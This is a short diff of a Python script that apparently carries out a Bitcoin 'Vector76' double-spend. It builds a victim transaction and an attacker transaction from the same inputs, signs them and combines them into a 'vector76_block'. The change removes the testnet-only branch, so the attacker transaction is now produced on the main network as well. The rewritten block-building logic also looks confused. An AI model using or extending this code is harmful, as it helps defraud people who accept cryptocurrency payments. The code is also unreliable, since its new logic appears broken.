@@ -106,19 +106,16 @@ change_btc_amt = (balance - send_amount) - fee#おつり
 
 
 
-if testnet:
-    tx_victim   = [{"address": victim_address, "value": send_amount}]
-    tx_attacker = [{"address": attacker_address, "value": send_amount}]
-else:
-    tx_victim   = [{"address": victim_address, "value": send_amount}]
+tx_victim   = [{"address": victim_address, "value": send_amount}]
+tx_attacker = [{"address": attacker_address, "value": send_amount}]
+vector76_block = [tx_attacker[0], tx_victim[0]]
 
 tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
 tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
-print(tx_victim)
 tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
 tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, fake_send_from))
 
-vector76_block = f"{tx_attacker}{tx_victim}"
+vector76_block = transaction_util.mktx_with_change(inputs, vector76_block, fee=fee)
 vector76_block = cryptos.serialize(transaction_util.sign(vector76_block, 0, fake_send_from))
 
 print()
